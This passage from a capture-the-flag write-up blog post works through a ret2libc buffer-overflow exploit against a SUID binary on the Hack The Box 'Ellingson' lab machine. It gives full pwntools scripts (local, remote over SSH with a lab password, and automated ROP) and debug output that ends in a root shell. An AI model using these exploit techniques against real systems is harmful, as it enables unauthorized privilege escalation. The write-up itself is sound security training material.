<span class="code-line"></span>
<span class="code-line"><span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span><span class="o">+</span> <span class="n">got_put</span> <span class="o">+</span> <span class="n">plt_put</span> <span class="o">+</span> <span class="n">plt_main</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c1">#Enter access password: 123456</span></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c1"># Leaked address printed in a readable format</span></span>
<span class="code-line"><span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span></span>
<span class="code-line"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span></span>
<span class="code-line"></code></pre></div>

<h2 id="ret2libc-locally">ret2libc locally</h2>
<p>We have the leak address of the <code>puts</code> call in <code>LIBC</code>. We can dynamically
compute the offset between our leaked address and the <code>LIBC</code> address. For that
we need to found the <code>puts</code> call in <code>LIBC</code>:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># locate libc.so.6</span>
<span class="code-line">/lib/x86_64-linux-gnu/libc.so.6</span>
<span class="code-line"></code></pre></div>

<p># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep puts
   194: 0000000000074040   429 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
   426: 0000000000074040   429 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5</p>
<p>The "beginning" of <code>LIBC</code> is then our leak address minus <code>0x74040</code>.</p>
<p>We now want to call a shell, for that we need the addresses of <code>system</code> and
<code>/bin/sh</code> in <code>LIBC</code>:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep system</span>
<span class="code-line">  235: 0000000000129d20    99 FUNC    GLOBAL DEFAULT   14 svcerr_systemerr@@GLIBC_2.2.5</span>
<span class="code-line">  613: 0000000000046ff0    45 FUNC    GLOBAL DEFAULT   14 __libc_system@@GLIBC_PRIVATE</span>
<span class="code-line">  1421: 0000000000046ff0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5</span>
<span class="code-line"># strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 |grep /bin/sh</span>
<span class="code-line">183cee /bin/sh</span>
<span class="code-line"></code></pre></div>

<p>As we want to exploit a SUID binary we also need to invoke the <code>setuid</code> call:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep setuid</span>
<span class="code-line">    25: 00000000000c8ac0   144 FUNC    WEAK   DEFAULT   14 setuid@@GLIBC_2.2.5</span>
<span class="code-line"></code></pre></div>

<p>Our exploit is now the following:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span></span>
<span class="code-line"><span class="c1">#context(log_level=&quot;DEBUG&quot;)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">plt_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span></span>
<span class="code-line"><span class="n">got_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">)</span></span>
<span class="code-line"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span></span>
<span class="code-line"><span class="n">plt_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401619</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">got_put</span> <span class="o">+</span> <span class="n">plt_put</span> <span class="o">+</span> <span class="n">plt_main</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c1">#Enter access password: 123456</span></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"><span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span></span>
<span class="code-line"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c1">#unpack again</span></span>
<span class="code-line"><span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">libc_put</span> <span class="o">=</span> <span class="mh">0x74040</span> <span class="c1">#local</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">offset</span> <span class="o">=</span> <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">libc_put</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;ghttps://wappalyzer.com/libc offset: </span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">offset</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">libc_sys</span> <span class="o">=</span> <span class="mh">0x46ff0</span> <span class="c1"># local</span></span>
<span class="code-line"><span class="n">libc_sh</span><span class="o">=</span> <span class="mh">0x183cee</span> <span class="c1"># local</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">setuid</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span></span>
<span class="code-line"><span class="n">libc_setuid</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xc8ac0</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span> <span class="c1"># local</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">sys</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">libc_sys</span><span class="p">)</span></span>
<span class="code-line"><span class="n">sh</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">libc_sh</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">setuid</span> <span class="o">+</span> <span class="n">libc_setuid</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">sh</span> <span class="o">+</span> <span class="n">sys</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
<span class="code-line"></code></pre></div>

<p>When running the script we grab a shell (as I use my Kali VM on root we don't
see a real privilege escalation):</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># python exploit.py</span>
<span class="code-line">[+] Starting local process &#39;./garbage&#39;: pid 1909</span>
<span class="code-line">Enter access password:</span>
<span class="code-line"></span>
<span class="code-line">access denied.</span>
<span class="code-line"></span>
<span class="code-line">[+] Leaked puts@GLIBC: @P\x84tC\x7f\x00\x00</span>
<span class="code-line">[*] glibc offset: 7f43747d1000</span>
<span class="code-line">Enter access password:</span>
<span class="code-line"></span>
<span class="code-line">access denied.</span>
<span class="code-line"></span>
<span class="code-line">[*] Switching to interactive mode</span>
<span class="code-line">$ id</span>
<span class="code-line">uid=0(root) gid=0(root) groups=0(root)</span>
<span class="code-line"></code></pre></div>

<h2 id="running-the-exploit-remotely">Running the exploit remotely</h2>
<p>In order to run the exploit remotely we need to change the <code>LIBC</code> addresses with
the one we copy from the ellingson machine. We also need to change our process
to use the one remote. <a href="https://github.com/Gallopsled/pwntools">Pnwtools</a> is
perfect for that as we just need to change our <code>process</code> variable. Our final
scrip is now:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s1">&#39;margo&#39;</span><span class="p">,</span> <span class="s1">&#39;10.10.10.139&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;iamgod$08&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">22</span><span class="p">)</span></span>
<span class="code-line"><span class="n">p</span><span class="o">=</span><span class="n">shell</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;/usr/bin/garbage&#39;</span><span class="p">])</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span></span>
<span class="code-line"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">plt_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span></span>
<span class="code-line"><span class="n">got_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">)</span></span>
<span class="code-line"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span></span>
<span class="code-line"><span class="n">plt_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401619</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">got_put</span> <span class="o">+</span> <span class="n">plt_put</span> <span class="o">+</span> <span class="n">plt_main</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c1">#Enter access password: 123456</span></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"><span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span></span>
<span class="code-line"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="c1">#unpack again</span></span>
<span class="code-line"><span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">libc_put</span> <span class="o">=</span> <span class="mh">0x74040</span> <span class="c1">#local</span></span>
<span class="code-line"><span class="n">libc_put</span> <span class="o">=</span> <span class="mh">0x809c0</span> <span class="c1"># remote</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">offset</span> <span class="o">=</span> <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">libc_put</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;glibc offset: </span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">offset</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">libc_sys</span> <span class="o">=</span> <span class="mh">0x46ff0</span> <span class="c1"># local</span></span>
<span class="code-line"><span class="n">libc_sys</span> <span class="o">=</span> <span class="mh">0x4f440</span> <span class="c1"># remote</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">libc_sh</span><span class="o">=</span> <span class="mh">0x183cee</span> <span class="c1"># local</span></span>
<span class="code-line"><span class="n">libc_sh</span><span class="o">=</span> <span class="mh">0x1b3e9a</span> <span class="c1"># remote</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">setuid</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">libc_setuid</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xc8ac0</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span> <span class="c1"># local</span></span>
<span class="code-line"><span class="n">libc_setuid</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xe5970</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span> <span class="c1"># remote</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">sys</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">libc_sys</span><span class="p">)</span></span>
<span class="code-line"><span class="n">sh</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">libc_sh</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">setuid</span> <span class="o">+</span> <span class="n">libc_setuid</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">sh</span> <span class="o">+</span> <span class="n">sys</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
<span class="code-line"></code></pre></div>

<p>The output of the script give us a root shell on the machine:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~# python exploitR.py</span>
<span class="code-line">[+] Connecting to 10.10.10.139 on port 22: Done</span>
<span class="code-line">[*] margo@10.10.10.139:</span>
<span class="code-line">    Distro    Ubuntu 18.04</span>
<span class="code-line">    OS:       linux</span>
<span class="code-line">    Arch:     amd64</span>
<span class="code-line">    Version:  4.15.0</span>
<span class="code-line">    ASLR:     Enabled</span>
<span class="code-line">[+] Starting remote process &#39;/usr/bin/garbage&#39; on 10.10.10.139: pid 3704</span>
<span class="code-line">[DEBUG] Sent 0xa9 bytes:</span>
<span class="code-line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span>
<span class="code-line">    *</span>
<span class="code-line">    00000080  41 41 41 41  41 41 41 41  9b 17 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│</span>
<span class="code-line">    00000090  28 40 40 00  00 00 00 00  50 10 40 00  00 00 00 00  │(@@·│····│P·@·│····│</span>
<span class="code-line">    000000a0  19 16 40 00  00 00 00 00  0a                        │··@·│····│·│</span>
<span class="code-line">    000000a9</span>
<span class="code-line">[DEBUG] Received 0x17 bytes:</span>
<span class="code-line">    &#39;Enter access password: &#39;</span>
<span class="code-line">[DEBUG] Received 0x2e bytes:</span>
<span class="code-line">    00000000  0a 61 63 63  65 73 73 20  64 65 6e 69  65 64 2e 0a  │·acc│ess │deni│ed.·│</span>
<span class="code-line">    00000010  c0 59 74 0f  f5 7f 0a 45  6e 74 65 72  20 61 63 63  │·Yt·│···E│nter│ acc│</span>
<span class="code-line">    00000020  65 73 73 20  70 61 73 73  77 6f 72 64  3a 20        │ess │pass│word│: │</span>
<span class="code-line">    0000002e</span>
<span class="code-line">Enter access password:</span>
<span class="code-line"></span>
<span class="code-line">access denied.</span>
<span class="code-line"></span>
<span class="code-line">[+] Leaked puts@GLIBC: �Yt\x0f�</span>
<span class="code-line">[*] glibc offset: 7ff50f6c5000</span>
<span class="code-line">[DEBUG] Sent 0xb9 bytes:</span>
<span class="code-line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span>
<span class="code-line">    *</span>
<span class="code-line">    00000080  41 41 41 41  41 41 41 41  9b 17 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│</span>
<span class="code-line">    00000090  00 00 00 00  00 00 00 00  70 a9 7a 0f  f5 7f 00 00  │····│····│p·z·│····│</span>
<span class="code-line">    000000a0  9b 17 40 00  00 00 00 00  9a 8e 87 0f  f5 7f 00 00  │··@·│····│····│····│</span>
<span class="code-line">    000000b0  40 44 71 0f  f5 7f 00 00  0a                        │@Dq·│····│·│</span>
<span class="code-line">    000000b9</span>
<span class="code-line">[DEBUG] Received 0x12 bytes:</span>
<span class="code-line">    &#39;\n&#39;</span>
<span class="code-line">    &#39;access denied.\n&#39;</span>
<span class="code-line">    &#39;# &#39;</span>
<span class="code-line">Enter access password:</span>
<span class="code-line"></span>
<span class="code-line">access denied.</span>
<span class="code-line"></span>
<span class="code-line">[*] Switching to interactive mode</span>
<span class="code-line"># $ id</span>
<span class="code-line">[DEBUG] Sent 0x3 bytes:</span>
<span class="code-line">    &#39;id\n&#39;</span>
<span class="code-line">[DEBUG] Received 0x31 bytes:</span>
<span class="code-line">    &#39;uid=0(root) gid=1002(margo) groups=1002(margo)\n&#39;</span>
<span class="code-line">    &#39;# &#39;</span>
<span class="code-line">uid=0(root) gid=1002(margo) groups=1002(margo)</span>
<span class="code-line"># $ cat /root/root.txt</span>
<span class="code-line">[DEBUG] Sent 0x13 bytes:</span>
<span class="code-line">    &#39;cat /root/root.txt\n&#39;</span>
<span class="code-line">[DEBUG] Received 0x23 bytes:</span>
<span class="code-line">    &#39;1cc73&lt;redacted&gt;\n&#39;</span>
<span class="code-line">    &#39;# &#39;</span>
<span class="code-line">1cc73&lt;redacterd&gt;</span>
<span class="code-line"></code></pre></div>

<h1 id="wrapping-up">Wrapping up</h1>
<p>What a journey! Exploiting this buffer overflow allow me to learn a lot about
<a href="http://pwntools.com">pwntools</a>. The binary manipulation is a bit strange as
here is no need to wait for the <code>garbage</code> binary to ask for the password. But
the possibility to exploit a remote binary so easily is something precious.</p>
<h2 id="automated-pwn">Automated pwn</h2>
<p>We can also use <a href="http://pwntools.com">pwntools</a> to fully automate the exploit
and make it compute the addresses automatically:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">,</span> <span class="n">setuid</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span></span>
<span class="code-line"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span></span>
<span class="code-line"><span class="n">rop</span><span class="o">=</span><span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span></span>
<span class="code-line"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">rop</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">regs</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;rdi&#39;</span><span class="p">],</span> <span class="n">order</span><span class="o">=</span><span class="s1">&#39;regs&#39;</span><span class="p">)</span></span>
<span class="code-line"><span class="n">rop</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span></span>
<span class="code-line"><span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">])</span></span>
<span class="code-line"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;ROP chains:&#39;</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span></span>
<span class="code-line"><span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until break line</span></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until access denied</span></span>
<span class="code-line"><span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span></span>
<span class="code-line"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;leaked puts: &#39;</span><span class="o">+</span><span class="n">leaked_puts</span><span class="p">)</span></span>
<span class="code-line"><span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">u64</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span>  <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span></span>
<span class="code-line"><span class="n">rop2</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span></span>
<span class="code-line"><span class="n">rop2</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)))</span></span>
<span class="code-line"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;ROP2: &#39;</span><span class="o">+</span> <span class="n">rop2</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">rop2</span><span class="p">)</span></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until break line</span></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until access denied</span></span>
<span class="code-line"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span>
<span class="code-line"></code></pre></div>

<p>But this won't "fully" work as the SUID part is not in it.</p>
    </div>

      <footer>
          <div>
            <b>Previous article:</b> <a href="../../2019/10/htb-writeup.html"> HTB: Writeup </a>
          </div>
          <div>
            <b>Next article:</b> <a href="../../2019/11/htb-jarvis.html"> HTB: Jarvis </a>
          </div>

<div class="social-buttons">


</div>
      </footer>


    <div class="clearfix"></div>

</article>
<!-- /.entry -->
            </div>
        </section>

        <aside class="sidebar pure-u-7-24">
            <div class="l-box">
    <section class="module menuitems">
        <h3 class="title module-title">Menu</h3>

        <ul>
                <li>
                    <span class= "icons icons-archives"></span>
                    <a href="/archives">archives</a>
                </li>
                <li>
                    <span class= "icons icons-feeds"></span>
                    <a href="/feeds/all.atom.xml">feeds</a>
                </li>
                <li>
                    <span class= "icons icons-links"></span>
                    <a href="/pages/links.html">links</a>
                </li>
        </ul>
    </section>

    <section class="module social">
        <h3 class="title module-title">Social</h3>

        <ul>
                <li>
                    <span class= "icons icons-github"></span>
                    <a href="https://github.com/maggick">github</a>
                </li>
                <li>
                    <span class= "icons icons-twitter"></span>
                    <a href="https://twitter.com/maggick_fr">twitter</a>
                </li>
                <li>
                    <span class= "icons icons-stackoverflow"></span>
                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
                </li>
        </ul>
    </section>


<section class="module tagcloud">
    <h3 class="title module-title">Tags</h3>

    <ul>
            <li class="tag tag-3">
              <a href="../../tag/smb.html">SMB</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/suid.html">SUID</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sudo.html">sudo</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/devops.html">devops</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/security.html">security</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/iot.html">IOT</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/linux.html">linux</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/laravel.html">laravel</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/impacket.html">impacket</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/capabilities.html">capabilities</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/docker.html">docker</a>
            </li>
            <li class="tag tag-3">
